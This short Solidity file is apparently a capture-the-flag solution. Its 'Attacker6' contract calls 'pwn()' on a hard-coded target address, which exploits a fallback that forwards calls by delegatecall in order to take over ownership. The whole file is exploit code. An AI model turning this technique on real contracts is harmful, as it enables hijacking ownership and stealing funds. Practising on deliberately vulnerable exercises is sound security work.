// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";

abstract contract Delegation {
    fallback() external virtual;
}

contract Attacker6 is Ownable {
    address targetAddr = 0x2Dd236Be7B9770219C799D30032C1F06F819C4Fa;

    function attack() external onlyOwner {
        targetAddr.call(abi.encodeWithSignature("pwn()"));
    }
}
